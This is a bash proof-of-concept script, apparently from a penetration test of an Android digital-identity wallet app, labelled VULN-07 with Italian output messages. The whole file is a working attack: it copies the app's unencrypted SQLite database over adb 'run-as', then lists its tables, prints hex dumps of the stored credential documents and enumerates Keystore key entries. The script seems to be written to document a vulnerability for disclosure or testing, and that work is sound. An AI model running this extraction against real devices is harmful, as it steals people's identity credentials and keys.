#!/bin/bash
# VULN-07: Extract credential database and dump contents
source "$(dirname "$0")/00-common.sh"

banner "VULN-07: CREDENTIAL DATABASE EXTRACTION"
check_device

DUMP="/tmp/av-docmanager.db"

info "Estrazione database credenziali..."
$ADB shell "run-as $PKG cat $DOCDB" > "$DUMP" 2>/dev/null

if [ ! -s "$DUMP" ]; then
    fail "Database vuoto o non accessibile"
    exit 1
fi

SIZE=$(wc -c < "$DUMP" | tr -d ' ')
ok "Database estratto: $SIZE bytes -> $DUMP"

echo ""
info "Schema:"
sqlite3 "$DUMP" ".schema" 2>/dev/null | sed 's/^/       /'

echo ""
info "Tabelle:"
for t in $(sqlite3 "$DUMP" "SELECT name FROM sqlite_master WHERE type='table';" 2>/dev/null); do
    COUNT=$(sqlite3 "$DUMP" "SELECT COUNT(*) FROM $t;" 2>/dev/null)
    echo "       $t: $COUNT righe"
done

DOCS=$(sqlite3 "$DUMP" "SELECT COUNT(*) FROM MzDocuments;" 2>/dev/null)
echo ""

if [ "$DOCS" -gt 0 ]; then
    ok "Trovati $DOCS documenti/credenziali"
    echo ""
    info "Documenti:"
    sqlite3 "$DUMP" "SELECT id, length(data) as bytes FROM MzDocuments;" 2>/dev/null | while IFS='|' read -r id bytes; do
        echo "       ID: $id  Size: $bytes bytes"
    done

    echo ""
    info "Dump CBOR (primi 200 bytes hex per documento):"
    sqlite3 "$DUMP" "SELECT id, hex(data) FROM MzDocuments;" 2>/dev/null | while IFS='|' read -r id hexdata; do
        echo "       --- $id ---"
        echo "       ${hexdata:0:200}..."
    done

    echo ""
    info "Chiavi nel Keystore (non protette da auth utente):"
    sqlite3 "$DUMP" "SELECT id, length(data) as bytes FROM MzAndroidKeystoreSecureArea;" 2>/dev/null | while IFS='|' read -r id bytes; do
        echo "       Key ID: $id  Size: $bytes bytes"
    done
else
    info "Nessun documento nel wallet (completa prima un enrollment)"
fi

echo ""
info "Il database NON e' cifrato (no SQLCipher)"
info "Estraibile con: adb shell \"run-as $PKG cat ...db\" > dump.db"

banner "RISULTATO: Credenziali estraibili da SQLite non cifrato"
